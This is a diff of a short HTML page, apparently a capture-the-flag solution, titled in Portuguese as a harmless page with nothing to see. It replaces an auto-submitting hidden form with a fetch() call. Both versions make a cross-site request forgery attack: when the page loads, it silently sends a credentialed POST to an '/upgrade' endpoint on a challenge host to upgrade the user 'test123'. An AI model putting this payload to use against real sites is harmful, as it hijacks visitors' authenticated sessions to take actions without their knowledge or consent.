@@ -1,12 +1,17 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <h1>Página inofensiva, nada a ver aqui 👀</h1>
-  <form id="csrfForm" action="http://challenges.pedroadao.org:25256/upgrade" method="POST">
-    <input type="hidden" name="username" value="test123">
-  </form>
+  <h1>Página inofensiva, nada a ver aqui</h1>
   <script>
-    document.getElementById('csrfForm').submit();
+    fetch('http://challenges.pedroadao.org:25256/upgrade', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: 'username=test123',
+      credentials: 'include'
+    });
   </script>
 </body>
 </html>
